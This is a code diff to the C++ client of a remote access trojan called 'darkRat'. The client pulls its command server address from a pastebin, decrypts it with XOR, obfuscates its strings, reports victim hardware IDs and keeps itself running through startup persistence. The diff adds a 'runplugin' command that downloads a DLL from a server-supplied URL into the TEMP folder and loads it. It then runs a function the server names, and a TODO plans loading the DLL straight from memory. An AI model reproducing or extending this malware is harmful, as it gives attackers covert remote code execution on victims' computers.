@@ -3,10 +3,22 @@
 #include <fstream>
 #include <hstring.h>
 
+struct ComInit
+{
+	HRESULT hr;
+	ComInit() : hr(::CoInitialize(nullptr)) {}
+	~ComInit() { if (SUCCEEDED(hr)) ::CoUninitialize(); }
+};
+
+typedef int(__stdcall* f_funci)();
 
 class Client
 {
 public:
+	typedef void(_cdecl* func)(std::string test);
+
+
+
 
 	std::string checkIfRegKeyExists(std::string key) {
 		LONG lResult;
@@ -19,6 +31,9 @@ public:
 		}
 		return "true";
 	}
+
+
+
 
 	static std::string returnFinalPost() {
 		std::string net2 = Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727"));
@@ -55,6 +70,7 @@ public:
 	static void darkMainThread(darkRat::config::config config) {
 		//darkRat::config::config config = darkRat::config::load();
 		std::thread startupPersistence;
+		std::thread runningPlugin;
 		//Fetch Gate from raw Site
 		std::string gateFromPatebin = XOR::encryptDecrypt(postRequest(config.pastebinUrl, "", "GET"));
 
@@ -94,6 +110,44 @@ public:
 						started = OBFUSCATE("success");
 					}
 					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
+				}
+				else if (responseFromGate.find(OBFUSCATE("runplugin")) != std::string::npos) {
+					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
+
+					std::string random_str = Helpers::RandomString(10);
+					std::string url(v[2]);
+					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".dll"));
+					Helpers::downloadFile(url, file);
+					std::string started = OBFUSCATE("failed");
+
+			
+					HINSTANCE hGetProcIDDLL = LoadLibrary(file.c_str());
+
+					if (!hGetProcIDDLL) {
+						std::cout << "could not load the dynamic library" << std::endl;
+					}
+
+					if (v[3] != "" ) {
+						func fn = (func)GetProcAddress(hGetProcIDDLL, (LPCSTR)v[3].c_str());
+						runningPlugin = std::thread(fn,v[4]);
+						//d::cout << "funci() returned " << funci() << std::endl;
+					}
+
+					//postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
+					
+
+					/*
+					TODO
+					Workings with a Byte array of a Dll but download in Memory is not finished
+
+					CLoad lib;
+					HANDLE hLibrary = 0;
+					hLibrary = lib.LoadFromMemory(buffer, sizeof(buffer)); // loaded the dll from byte array.
+					func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "DisplayHelloFromDLL");
+					fn();
+					lib.FreeLibraryFromMemory(hLibrary);
+					*/
+				//	postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
 				}
 				else {
 					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
